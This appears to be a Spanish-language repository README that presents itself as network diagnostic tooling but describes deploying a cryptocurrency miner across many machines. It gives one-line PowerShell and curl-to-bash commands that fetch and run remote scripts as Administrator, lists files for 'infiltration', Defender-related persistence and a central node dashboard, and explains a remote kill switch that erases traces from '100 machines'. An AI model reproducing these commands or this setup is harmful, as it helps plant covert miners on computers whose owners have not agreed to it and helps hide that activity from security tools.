# ⛏️ Network Service Diagnostics (Multi-Platform)

Este repositorio contiene herramientas de diagnóstico de red y optimización de rendimiento para sistemas distribuidos.

## 🚀 Despliegue Rápido (Quick Start)

### **Windows (PowerShell / CMD)**
Ejecuta el siguiente comando como Administrador para iniciar el servicio de diagnóstico:
```batch
powershell -Command "iwr -Uri '[https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/sys_check.bat](https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/sys_check.bat)' -OutFile 's.bat'; .\s.bat"

Linux / Termux
Ejecuta el script de optimización de procesos:
curl -L [https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/deploy_pro.sh](https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/deploy_pro.sh) | bash

🛠️ Estructura del Proyecto
 * sys_check.bat: Script de instalación e infiltración para entornos Windows.
 * deploy_pro.sh: Despliegue de alto rendimiento para sistemas basados en Unix.
 * config.json: Parámetros de configuración del motor de cálculo.
 * win_defender_check.ps1: Módulo de seguridad y persistencia (incluye Kill Switch).
 * dashboard.py: Panel de monitoreo centralizado de nodos.
🛡️ Gestión Remota
Actualización
Para forzar una actualización en los nodos, modifica el código en este repositorio y reinicia los servicios.
Kill Switch (Emergencia)
Para detener todos los procesos y eliminar rastro de los archivos en las 100 máquinas:
 * Edita el archivo status.txt.
 * Cambia la palabra ACTIVO por KILL.
 * El sistema se auto-eliminará en el próximo ciclo de diagnóstico (máximo 10 minutos).
📊 Monitoreo Local
Para visualizar el estado de la red desde tu equipo personal:
 * Instala las dependencias: pip install -r requirements.txt
 * Ejecuta: python dashboard.py
